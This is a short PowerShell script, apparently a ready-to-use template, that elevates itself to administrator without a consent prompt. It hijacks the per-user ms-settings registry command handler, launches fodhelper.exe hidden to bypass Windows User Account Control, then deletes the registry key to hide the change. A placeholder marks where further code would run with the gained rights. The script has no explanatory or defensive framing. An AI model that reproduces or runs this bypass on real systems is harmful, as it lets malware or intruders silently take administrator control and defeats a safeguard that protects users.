function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-Admin)) {
    Write-Host "Not admin. Attempting elevation..." -ForegroundColor Yellow
    
    $regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
    New-Item $regPath -Force | Out-Null
    Set-ItemProperty $regPath "(Default)" "$PSCommandPath" -Force
    Set-ItemProperty $regPath "DelegateExecute" "" -Force
    
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Start-Sleep 2
    Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
    exit
}

Write-Host "Running with Administrator privileges." -ForegroundColor Green

# your code goes here
pause
